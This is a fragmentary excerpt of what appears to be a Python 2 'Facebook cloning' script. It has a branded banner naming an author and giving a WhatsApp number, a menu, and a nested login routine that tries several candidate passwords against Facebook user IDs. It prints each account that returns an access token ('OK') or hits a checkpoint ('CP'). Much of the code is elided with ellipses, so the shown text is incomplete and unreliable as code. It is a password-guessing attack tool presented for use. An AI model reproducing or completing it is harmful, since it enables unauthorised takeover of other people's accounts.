...
\033[1;91m-----------------------------------------------
\033[1;92m AUTHOR BOLANI : ZULFIQAR BALOCH
\033[1;92m Wtsapp  : 03403233915
\033[1;91m-----------------------------------------------
\033[1;92m  : BALOCH KING
\033[1;92m DEVILPURE ZULFIQAR BALOCH
\033[1;91m-----------------------------------------------
\033[1;91m-----------------------------------------------                           
                 ONLY USE DATA 4G SPEED
\033[1;91m-----------------------------------------------
...
def main():
    ...
    print("\033[1;91m[0]\033[1;97mBOLANI")
...
def main_select():
    ...
    BOLANI = raw_input("\033[1;97m[#] Choose Opition --->\033[1;96m ")
    ...
    if Mz =="2":
        ...
        os.system("xdg-open https://www.facebook.com/BOLANI.SHAH.x")
...
def login_select():
    ...
    B= raw_input(" \033[1;97m Choose Option :\033[1;96m ")
	...
	print("")
        ...
        os.system("xdg-openhttps://www.facebook.com/BOLANI.SHAH.x")
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;93m[BOLANI>CP] "+uid+" = "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[BOLANI = OK] "+uid+" = "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[BOLANI>CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[BOLANI = OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[BOLANI>CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[BOLANI = OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[BOLANI = OK] "+uid+" = "+pass4+"\x1b[1;0m")
